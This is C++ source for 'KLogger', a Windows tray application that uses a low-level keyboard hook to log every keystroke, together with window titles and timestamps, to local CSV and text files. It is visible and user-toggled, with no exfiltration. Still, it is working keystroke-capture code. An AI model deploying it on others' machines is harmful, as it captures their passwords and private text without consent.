// Headers
#include <windows.h>
#include <tchar.h>
#include <commctrl.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include "resource.h"
using namespace std;

// Libs
#pragma comment(lib, "comctl32.lib")

// Various consts & Defs
#define	WM_USER_SHELLICON WM_USER + 1
#define WM_TASKBAR_CREATE RegisterWindowMessage(_T("TaskbarCreated"))

// BEGIN KeyLogger
// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)

// Globals
HWND hWnd;
HINSTANCE hInst;
NOTIFYICONDATA structNID;
BOOL Enabled;

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

std::ofstream OUTPUT_FILE;
std::ofstream OUTPUT_FILE_STRINGS;
std::ofstream OUTPUT_FILE_FULL;

char lastwindow[256];

int Save(int key_stroke)
{

	if ((key_stroke >= 1) && (key_stroke == 6))
		return 0; // ignore mouse clicks

	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;
	if (foreground) {
		//get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256] = "";
		GetWindowText(foreground, window_title, 256);
		
		// get time
		time_t t = time(NULL);
		struct tm timeinfo;
		localtime_s(&timeinfo, &t);
		char s[64];
		strftime(s, sizeof(s), "%c", &timeinfo);

		OUTPUT_FILE << "\n" << window_title << "," << s << ",";

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy_s(lastwindow, window_title);
			OUTPUT_FILE_STRINGS << "\n" << s << "," << window_title << ",";
		}
	}


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		OUTPUT_FILE << "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		OUTPUT_FILE << "[NEWLINE]";
	else if (key_stroke == VK_SPACE)
		OUTPUT_FILE << "[SPACE]";
	else if (key_stroke == VK_TAB)
		OUTPUT_FILE << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		OUTPUT_FILE << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		OUTPUT_FILE << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		OUTPUT_FILE << "[ESCAPE]";
	else if (key_stroke == VK_END)
		OUTPUT_FILE << "[END]";
	else if (key_stroke == VK_HOME)
		OUTPUT_FILE << "[HOME]";
	else if (key_stroke == VK_LEFT)
		OUTPUT_FILE << "[LEFT]";
	else if (key_stroke == VK_UP)
		OUTPUT_FILE << "[UP]";
	else if (key_stroke == VK_RIGHT)
		OUTPUT_FILE << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		OUTPUT_FILE << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		OUTPUT_FILE << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		OUTPUT_FILE << "-";
	else if (key_stroke == 20)
		OUTPUT_FILE << "[CAPSLOCK]";
	else {
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		//map virtual key according to keyboard layout 
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		//tolower converts it to lowercase properly
		if (!lowercase) key = tolower(key);
		OUTPUT_FILE << char(key);
	}
	OUTPUT_FILE << "," << key_stroke;
	OUTPUT_FILE_STRINGS << "," << key_stroke;
	OUTPUT_FILE_FULL << "," << key_stroke;
	//instead of opening and closing file handlers every time, keep file open and flush.
	OUTPUT_FILE.flush();
	OUTPUT_FILE_STRINGS.flush();
	OUTPUT_FILE_FULL.flush();
	return 0;
}

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN && Enabled)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}
// END KeyLogger 

// BEGIN Tray Icon
/*
Name: ... AboutDlgProc(...)
Desc: proccess the about dialog
*/
BOOL CALLBACK AboutDlgProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
    switch(Message)
    {
        case WM_INITDIALOG:
			return TRUE;
			break;
        case WM_COMMAND:
			switch(LOWORD(wParam))
			{
				case IDOK:
					EndDialog(hwnd, IDOK);
					break;
			}
			break;
        default:
            return FALSE;
    }
    return TRUE;
}

/* ================================================================================================================== */

/*
Name: ... WndProc(...)
Desc: Main hidden "Window" that handles the messaging for our system tray
*/
LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	POINT lpClickPoint;

	if(Message == WM_TASKBAR_CREATE) {			// Taskbar has been recreated (Explorer crashed?)
		// Display tray icon
		if(!Shell_NotifyIcon(NIM_ADD, &structNID)) {
			MessageBox(NULL, "Systray Icon Creation Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
			DestroyWindow(hWnd);
			return -1;
		}
	}

	switch(Message)
	{
		case WM_DESTROY:
			Shell_NotifyIcon(NIM_DELETE, &structNID);	// Remove Tray Item
			PostQuitMessage(0);							// Quit
			break;
		case WM_USER_SHELLICON:			// sys tray icon Messages
			switch(LOWORD(lParam))
			{
				case WM_RBUTTONDOWN:
					{
						HMENU hMenu, hSubMenu;
						// get mouse cursor position x and y as lParam has the Message itself
						GetCursorPos(&lpClickPoint);

						// Load menu resource
						hMenu = LoadMenu(hInst, MAKEINTRESOURCE(IDR_POPUP_MENU));
						if(!hMenu)
							return -1;	// !0, message not successful?

						// Select the first submenu
						hSubMenu = GetSubMenu(hMenu, 0);
						if(!hSubMenu) {
							DestroyMenu(hMenu);        // Be sure to Destroy Menu Before Returning
							return -1;
						}

						// Set Enabled State
						if (Enabled)
							CheckMenuItem(hMenu, ID_POPUP_ENABLE, MF_BYCOMMAND | MF_CHECKED);
						else
							CheckMenuItem(hMenu, ID_POPUP_ENABLE, MF_BYCOMMAND | MF_UNCHECKED);
						// Display menu
						SetForegroundWindow(hWnd);
						TrackPopupMenu(hSubMenu, TPM_LEFTALIGN | TPM_LEFTBUTTON | TPM_BOTTOMALIGN, lpClickPoint.x, lpClickPoint.y, 0, hWnd, NULL);
						SendMessage(hWnd, WM_NULL, 0, 0);

						// Kill off objects we're done with
						DestroyMenu(hMenu);
					}
					break;
			}
			break;
		case WM_CLOSE:
				DestroyWindow(hWnd);	// Destroy Window
				break;
		case WM_COMMAND:
			switch(LOWORD(wParam))
			{
				case ID_POPUP_EXIT:
					DestroyWindow(hWnd);		// Destroy Window
					break;
				case ID_POPUP_ABOUT:			// Open about box
					DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_ABOUT), hwnd, (DLGPROC)AboutDlgProc);
					break;
				case ID_POPUP_ENABLE:			// Toggle Enable
					Enabled = !Enabled;
					int idi_tray_icon;
					if (Enabled)
						idi_tray_icon = IDI_TRAYICON;
					else 
						idi_tray_icon = IDI_TRAYICON_DISABLED;
					structNID.hIcon = LoadIcon(hInst, (LPCTSTR)MAKEINTRESOURCE(idi_tray_icon));
					// Display tray icon
					if (!Shell_NotifyIcon(NIM_MODIFY, &structNID)) {
						MessageBox(NULL, "Systray Icon Modification Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
					}
					DestroyIcon(structNID.hIcon);
					break;
			}
			break;
		default:
			return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;		// Return 0 = Message successfully proccessed
}

/*
Name: ... WinMain(...)
Desc: Main Entry point
*/
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	MSG Msg;
	WNDCLASSEX wc;
	HANDLE hMutexInstance;
	INITCOMMONCONTROLSEX iccex;

	// Check for single instance
	// ------------------------------
	// Note: I recommend to use the GUID Creation Tool for the most unique id
	// Tools->Create GUID for Visual Studio .Net 2003
	// Or search somewhere in the Platform SDK for other environments
	hMutexInstance = CreateMutex(NULL, FALSE,_T("KLogger-{1EB489D6-6702-43cd-A859-C2BA7DB58B06}"));
	if(GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_ACCESS_DENIED)
		return 0;

	// Copy instance so it can be used globally in other methods
	hInst = hInstance;

	// Init common controls (if you're using them)
	// ------------------------------
	// See: http://msdn.microsoft.com/library/default.asp?url=/library/en-us/shellcc/platform/commctls/common/structures/initcommoncontrolsex.asp
	iccex.dwSize = sizeof(INITCOMMONCONTROLSEX);
	iccex.dwICC = ICC_UPDOWN_CLASS | ICC_LISTVIEW_CLASSES;
	if(!InitCommonControlsEx(&iccex)) {
		MessageBox(NULL, "Cannot Initialize Common Controls!", "Error!", MB_ICONEXCLAMATION | MB_OK);
		return 0;
	}

	// Window "class"
	wc.cbSize =			sizeof(WNDCLASSEX);
	wc.style =			CS_HREDRAW | CS_VREDRAW;
	wc.lpfnWndProc =	WndProc;
	wc.cbClsExtra =		0;
	wc.cbWndExtra =		0;
	wc.hInstance =		hInstance;
	wc.hIcon =			LoadIcon(hInstance, (LPCTSTR)MAKEINTRESOURCE(IDI_TRAYICON_DISABLED));
	wc.hCursor =		LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground =	(HBRUSH)GetStockObject(WHITE_BRUSH);
	wc.lpszMenuName =	NULL;
	wc.lpszClassName =	"KLogger";
	wc.hIconSm		 =	LoadIcon(hInstance, (LPCTSTR)MAKEINTRESOURCE(IDI_TRAYICON_DISABLED));
	if(!RegisterClassEx(&wc)) {
		MessageBox(NULL, "Window Registration Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
		return 0;
	}

	// Create the hidden window
	hWnd = CreateWindowEx(
		WS_EX_CLIENTEDGE,
		"KLogger",
		"KLogger Tray App",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL,
		NULL,
		hInstance,
		NULL);
	if(hWnd == NULL) {
		MessageBox(NULL, "Window Creation Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
		return 0;
	}

	// tray icon settings
	structNID.cbSize = sizeof(NOTIFYICONDATA);
	structNID.hWnd = (HWND)hWnd;
	structNID.uID = IDI_TRAYICON;
	structNID.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
	strcpy_s(structNID.szTip, "KLogger");
	structNID.hIcon = LoadIcon(hInstance, (LPCTSTR)MAKEINTRESOURCE(IDI_TRAYICON_DISABLED));
	structNID.uCallbackMessage = WM_USER_SHELLICON;

	// Display tray icon
	if(!Shell_NotifyIcon(NIM_ADD, &structNID)) {
		MessageBox(NULL, "Systray Icon Creation Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
		return 0;
	}
	DestroyIcon(structNID.hIcon);
	// Set mode to enabled
	Enabled = FALSE;

	//open output file in append mode
	OUTPUT_FILE.open("klog.csv", std::ios_base::app);
	OUTPUT_FILE_STRINGS.open("klog.txt", std::ios_base::app);
	OUTPUT_FILE_FULL.open("klog_full.txt", std::ios_base::app);

	// Set the hook
	SetHook();

	// Message Loop
	while(GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return Msg.wParam;
}
